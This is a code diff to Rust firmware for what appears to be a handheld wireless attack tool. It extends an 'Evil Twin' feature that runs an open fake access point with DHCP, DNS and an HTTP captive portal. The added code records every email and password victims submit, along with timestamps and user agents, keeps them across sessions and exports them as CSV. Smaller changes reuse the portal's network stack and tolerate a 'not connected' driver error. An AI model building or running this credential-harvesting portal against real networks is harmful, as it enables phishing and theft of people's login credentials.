@@ -238,6 +238,9 @@ pub async fn run(controller: WifiController<'static>) -> ! {
     if let Err(error) = controller.set_config(&Config::Station(StationConfig::default())) {
         set_status(&alloc::format!("station config failed: {error:?}"));
     }
+    // Evil Twin network state survives between runs: the resources backing the
+    // portal stack can only be initialized once per boot.
+    let mut portal_net:Option<PortalNet>=None;
     loop {
         match take_command() {
             Some(WifiCommand::Scan) => {scan_session(&mut controller).await;}
@@ -252,7 +255,7 @@ pub async fn run(controller: WifiController<'static>) -> ! {
             Some(WifiCommand::Stream{channel,filter})=>monitor_session(&mut controller,channel,filter,false,true).await,
             Some(WifiCommand::Connect{ssid,password})=>connect_session(&mut controller,ACTIVE_TOKEN.load(Ordering::Acquire),ssid,password).await,
             Some(WifiCommand::Disconnect)=>{if disconnect(&mut controller).await{set_status("station disconnected");}},
-            Some(WifiCommand::Portal{ssid,channel,template})=>portal_session(&mut controller,ACTIVE_TOKEN.load(Ordering::Acquire),ssid,channel,template).await,
+            Some(WifiCommand::Portal{ssid,channel,template})=>portal_session(&mut controller,ACTIVE_TOKEN.load(Ordering::Acquire),ssid,channel,template,&mut portal_net).await,
             Some(WifiCommand::Stop) => {}
             None => {}
         }
@@ -462,6 +465,28 @@ fn note_portal_request(){critical_section::with(|cs|{let mut s=WIFI_STATE.borrow
 /// Captive-portal counters for the Evil Twin screen.
 pub fn portal_snapshot()->(u32,u32){critical_section::with(|cs|{let s=WIFI_STATE.borrow_ref(cs);(s.portal_clients,s.portal_requests)})}
 
+/// Portal submissions persist across sessions so the tool stop can export them;
+/// `CredentialStore::new` is not const, hence the lazy Option.
+static PORTAL_CREDS:Mutex<RefCell<Option<portal::CredentialStore<16>>>>=Mutex::new(RefCell::new(None));
+fn note_portal_credential(form:&portal::FormCapture,user_agent:Option<&str>){
+    critical_section::with(|cs|{
+        let mut slot=PORTAL_CREDS.borrow_ref_mut(cs);
+        let store=slot.get_or_insert_with(portal::CredentialStore::new);
+        store.push(portal::CapturedCredentials{
+            email:form.email.clone().unwrap_or_default(),
+            password:form.password.clone().unwrap_or_default(),
+            at_ms:embassy_time::Instant::now().as_millis(),
+            user_agent:user_agent.map(String::from),
+        });
+    });
+}
+/// Captured portal credentials as a CSV document, for the Evil Twin export.
+pub fn portal_csv()->String{
+    critical_section::with(|cs|{
+        PORTAL_CREDS.borrow_ref(cs).as_ref().map(|store|store.to_csv()).unwrap_or_default()
+    })
+}
+
 /// Answer DISCOVER/REQUEST so joining clients actually get an address.
 async fn dhcp_service(stack:embassy_net::Stack<'static>)->!{
     use embassy_net::udp::{PacketMetadata,UdpSocket};
@@ -535,7 +560,13 @@ async fn http_service(stack:embassy_net::Stack<'static>,portal_config:&PortalCon
             }
         }
         let response=match portal::parse_request(&buffer[..used]){
-            Some(request)=>portal::response_for(&portal::route(&request),portal_config),
+            Some(request)=>{
+                let action=portal::route(&request);
+                if let portal::PortalAction::Capture(form)=&action{
+                    note_portal_credential(form,request.user_agent.as_deref());
+                }
+                portal::response_for(&action,portal_config)
+            },
             None=>portal::http_response(400,"text/plain",b"bad request",&[]),
         };
         let _=embassy_time::with_timeout(embassy_time::Duration::from_secs(1),socket.write_all(&response)).await;
@@ -546,8 +577,13 @@ async fn http_service(stack:embassy_net::Stack<'static>,portal_config:&PortalCon
     }
 }
 
+/// Portal network state, built on first use and reused afterwards. The
+/// `StackResources` behind it can only be initialized once per boot, so
+/// re-creating the stack per session would panic on the second run.
+struct PortalNet{stack:embassy_net::Stack<'static>,runner:embassy_net::Runner<'static,esp_radio::wifi::Interface>}
+
 /// Evil Twin: open AP plus the three services a captive portal needs.
-async fn portal_session(controller:&mut WifiController<'static>,token:u32,ssid:String,channel:u8,template:PortalTemplate){
+async fn portal_session(controller:&mut WifiController<'static>,token:u32,ssid:String,channel:u8,template:PortalTemplate,portal_net:&mut Option<PortalNet>){
     if !disconnect(controller).await{return}
     let Ok(name)=ssid.as_str().try_into()else{set_status("SSID exceeds 32 bytes");return};
     let config=AccessPointConfig::default()
@@ -558,24 +594,28 @@ async fn portal_session(controller:&mut WifiController<'static>,token:u32,ssid:S
         set_status(&alloc::format!("AP start failed: {error:?}"));return
     }
     if stop_requested(){set_status("portal cancelled");return}
-    let Some(interface)=esp_radio::wifi::Interface::try_access_point()else{
-        set_status("AP interface unavailable");return
-    };
-    static PORTAL_RESOURCES:StaticCell<embassy_net::StackResources<5>>=StaticCell::new();
-    let seed=embassy_time::Instant::now().as_micros() as u64;
-    let net_config=embassy_net::Config::ipv4_static(embassy_net::StaticConfigV4{
-        address:embassy_net::Ipv4Cidr::new(
-            embassy_net::Ipv4Address::new(PORTAL_IP[0],PORTAL_IP[1],PORTAL_IP[2],PORTAL_IP[3]),24),
-        gateway:None,
-        dns_servers:Default::default(),
-    });
-    let(stack,mut runner)=embassy_net::new(interface,net_config,PORTAL_RESOURCES.init(embassy_net::StackResources::new()),seed);
+    if portal_net.is_none(){
+        let Some(interface)=esp_radio::wifi::Interface::try_access_point()else{
+            set_status("AP interface unavailable");return
+        };
+        static PORTAL_RESOURCES:StaticCell<embassy_net::StackResources<5>>=StaticCell::new();
+        let seed=embassy_time::Instant::now().as_micros() as u64;
+        let net_config=embassy_net::Config::ipv4_static(embassy_net::StaticConfigV4{
+            address:embassy_net::Ipv4Cidr::new(
+                embassy_net::Ipv4Address::new(PORTAL_IP[0],PORTAL_IP[1],PORTAL_IP[2],PORTAL_IP[3]),24),
+            gateway:None,
+            dns_servers:Default::default(),
+        });
+        let(stack,runner)=embassy_net::new(interface,net_config,PORTAL_RESOURCES.init(embassy_net::StackResources::new()),seed);
+        *portal_net=Some(PortalNet{stack,runner});
+    }
+    let Some(net)=portal_net.as_mut()else{set_status("portal stack unavailable");return};
     let portal_config=PortalConfig{template,ap_ip:PORTAL_IP,ssid,channel,capture_limit:16};
     set_status(&alloc::format!("portal up: {}",portal_config.ssid));
     let services=async{
-        embassy_futures::join::join3(dhcp_service(stack),dns_service(stack),http_service(stack,&portal_config)).await
+        embassy_futures::join::join3(dhcp_service(net.stack),dns_service(net.stack),http_service(net.stack,&portal_config)).await
     };
-    let running=async{embassy_futures::join::join(runner.run(),services).await};
+    let running=async{embassy_futures::join::join(net.runner.run(),services).await};
     match select(running,wait_for_stop(token)).await{
         Either::First(_)=>{},
         Either::Second(_)=>set_status("portal stopped"),
@@ -610,7 +650,12 @@ pub fn dissect_latest()->Vec<String>{
 async fn cancelled_or_timeout(_id:u32,seconds:u64){let deadline=embassy_time::Instant::now()+embassy_time::Duration::from_secs(seconds);loop{if stop_requested()||embassy_time::Instant::now()>=deadline{return}embassy_time::Timer::after(embassy_time::Duration::from_millis(20)).await;}}
 async fn disconnect(controller:&mut WifiController<'static>)->bool{
     match embassy_time::with_timeout(embassy_time::Duration::from_secs(3),controller.disconnect_async()).await{
-        Ok(Ok(_))=>true,Ok(Err(e))=>{set_status(&alloc::format!("disconnect failed: {e:?}"));false},Err(_)=>{set_status("disconnect timeout");false}
+        Ok(Ok(_))=>true,
+        // On a fresh boot the station was never connected; the driver reports
+        // that state as an error. Being already disconnected is exactly what
+        // every caller needs, so it must not abort capture/portal/connect.
+        Ok(Err(esp_radio::wifi::WifiError::NotConnected))=>true,
+        Ok(Err(e))=>{set_status(&alloc::format!("disconnect failed: {e:?}"));false},Err(_)=>{set_status("disconnect timeout");false}
     }
 }
 async fn connect_session(controller:&mut WifiController<'static>,id:u32,ssid:String,password:String){
